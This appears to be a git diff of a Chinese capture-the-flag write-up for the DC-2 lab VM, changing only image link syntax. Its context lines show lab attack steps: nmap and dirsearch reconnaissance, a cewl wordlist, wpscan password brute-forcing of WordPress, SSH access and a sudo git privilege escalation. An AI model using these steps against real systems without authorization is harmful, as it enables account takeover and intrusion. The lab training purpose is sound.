@@ -23,7 +23,7 @@ nmap -sV -p80 192.168.1.102
 whatweb http://192.168.1.102
 ```
 访问端口80发现错误
-![[dc2-登陆网页错误.png]]
+![dc2-登陆网页错误](../img/DC-2/dc2-登陆网页错误.png)
 网页端访问失败，且发现 IP `192.168.1.102` 被转为域名 `dc-2/`
 更改本机`/etc/hosts`文件并添加一行 IP 域名指向
 ```text
@@ -50,18 +50,18 @@ If you can’t find it, log in as another.
 ```bash
 whatweb http://192.168.1.102
 ```
-![[dc2-查询站点配置.png]]
+![dc2-查询站点配置](../img/DC-2/dc2-查询站点配置.png)
 指示 Wordpress 站点，版本 4.7.10
 首先挖掘目录
 ```bash
 dirsearch -u http://dc-2/
 ```
-![[dc2-挖掘目录.png]]
+![dc2-挖掘目录](../img/DC-2/dc2-挖掘目录.png)
 ```
 [01:21:12] 302 -    0B  - /wp-admin/  ->  http://dc-2/wp-login.php?redirect_to=http%3A%2F%2Fdc-2%2Fwp-admin%2F&reauth=1
 ```
 访问`/wp-admin/`，发现登录入口
-![[dc2-登录入口.png]]
+![dc2-登录入口](../img/DC-2/dc2-登录入口.png)
 按照提示，先用`cewl`工具对网站生成字典，保存到`password.txt`，再用`wpscan`进行爆破。
 `wpscan`常见命令：
 ```bash
@@ -72,13 +72,13 @@ wpscan --url http://dc-2 --enumerate p
 # 枚举用户
 wpscan --url http://dc-2 --enumerate u
 ```
-![[dc2-wpscan界面.png]]
-![[dc2-wpscan枚举用户名.png]]
+![dc2-wpscan界面](../img/DC-2/dc2-wpscan界面.png)
+![dc2-wpscan枚举用户名](../img/DC-2/dc2-wpscan枚举用户名.png)
 ```bash
 cewl http://dc-2 > password.txt
 wpscan --url http://dc-2 --passwords password.txt
 ```
-![[dc2-爆破密码.png]]
+![dc2-爆破密码](../img/DC-2/dc2-爆破密码.png)
 得到密码
 ```
 [!] Valid Combinations Found:
@@ -101,7 +101,7 @@ Hope you found another entry point.
 nmap -sS -p- 192.168.1.102
 nmap -sV -p80,7744 192.168.1.102
 ```
-![[dc2-7744.png]]
+![dc2-7744](../img/DC-2/dc2-7744.png)
 发现7744端口，尝试用`ssh`连接
 ```bash
 ssh tom@192.168.1.102 -p 7744
@@ -176,7 +176,7 @@ sudo git branch --help status
 cd ../..
 cat final-flag.txt
 ```
-![[dc2-最终Flag.png]]
+![dc2-最终Flag](../img/DC-2/dc2-最终Flag.png)
 ```
  __    __     _ _       _                    _ 
 / / /\ \ \___| | |   __| | ___  _ __   ___  / \
